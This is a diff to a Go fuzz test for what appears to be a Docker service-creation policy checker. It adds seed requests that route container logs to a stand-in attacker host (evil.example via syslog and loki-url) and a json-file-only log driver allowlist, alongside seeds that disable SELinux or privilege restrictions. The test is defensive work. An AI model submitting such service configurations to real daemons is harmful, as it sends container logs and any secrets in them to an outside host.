@@ -116,6 +116,10 @@ func FuzzService(f *testing.F) {
 	f.Add("/services/create", []byte(`{"TaskTemplate":{"ContainerSpec":{"Image":"busybox","Privileges":{"SELinuxContext":{"Disable":true}}}}}`))
 	f.Add("/services/create", []byte(`{"TaskTemplate":{"ContainerSpec":{"Image":"busybox","Privileges":{"SELinuxContext":{"User":"system_u","Role":"system_r","Type":"spc_t","Level":"s0"}}}}}`))
 	f.Add("/services/create", []byte(`{"TaskTemplate":{"ContainerSpec":{"Image":"busybox","Privileges":{"NoNewPrivileges":false}}}}`))
+	// Log driver seeds, run against the strict policy's allowed_log_drivers.
+	f.Add("/services/create", []byte(`{"TaskTemplate":{"ContainerSpec":{"Image":"busybox"},"LogDriver":{"Name":"syslog","Options":{"syslog-address":"tcp://evil.example:514"}}}}`))
+	f.Add("/services/create", []byte(`{"TaskTemplate":{"ContainerSpec":{"Image":"busybox"},"LogDriver":{"Name":"json-file","Options":{"loki-url":"https://evil.example"}}}}`))
+	f.Add("/services/create", []byte(`{"TaskTemplate":{"ContainerSpec":{"Image":"busybox"},"LogDriver":null}}`))
 
 	// Lenient policy: registry/mount allowlists only, no privilege hardening.
 	lenient := newServicePolicy(ServiceOptions{
@@ -135,6 +139,7 @@ func FuzzService(f *testing.F) {
 		DenyUnconfinedAppArmor:    true,
 		DenySelinuxDisable:        true,
 		DenySelinuxLabelOverride:  true,
+		AllowedLogDrivers:         []string{"json-file"},
 	})
 
 	f.Fuzz(func(t *testing.T, path string, body []byte) {
